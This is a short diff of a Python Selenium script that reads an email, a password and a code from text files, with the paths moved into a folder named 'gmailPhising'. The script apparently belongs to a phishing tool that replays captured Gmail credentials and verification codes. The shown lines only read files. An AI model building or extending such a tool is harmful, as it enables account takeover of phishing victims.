@@ -1,8 +1,8 @@
 import time, os
 from selenium import webdriver
-emailPath = "email.txt"
-passwordPath = "pass.txt"
-codePath = "code.txt"
+emailPath = "gmailPhising/email.txt"
+passwordPath = "gmailPhising/pass.txt"
+codePath = "gmailPhising/code.txt"
 femail = open(emailPath, "r")
 email = femail.readline()
 fpass = open(passwordPath, "r")
